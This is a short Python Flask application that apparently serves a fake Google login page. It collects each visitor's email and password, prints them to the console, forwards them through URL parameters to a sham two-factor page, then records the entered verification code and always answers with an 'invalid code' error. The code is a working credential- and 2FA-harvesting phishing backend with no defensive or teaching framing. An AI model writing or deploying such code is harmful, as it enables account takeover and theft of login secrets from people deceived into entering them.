from flask import Flask, render_template, redirect, url_for, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('googlelogin.html')

@app.route('/2fa', methods=['POST'])
def two_factor_auth():
    # Get the user's email and password from the form
    email = request.form['email']
    password = request.form['password']

    # Print the email and password (or log it) to see what the user entered
    print(f"Email: {email}")
    print(f"Password: {password}")

    # Redirect to 2FA page and pass the email and password
    return redirect(url_for('two_factor_auth_page', email=email, password=password))

@app.route('/2fa')
def two_factor_auth_page():
    # Retrieve the email and password from the URL parameters
    email = request.args.get('email')
    password = request.args.get('password')

    # Pass the data to the 2FA page
    return render_template('2fa.html', email=email, password=password)

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    # Get the entered verification code from the form
    verification_code = request.form['verification-code']

    # Print the verification code to see what the user entered
    print(f"Verification Code: {verification_code}")

    # You can also add further processing here (e.g., validate the code)
    return "[Error] Invalid Code Entered: " + verification_code

if __name__ == '__main__':
    app.run(debug=True)
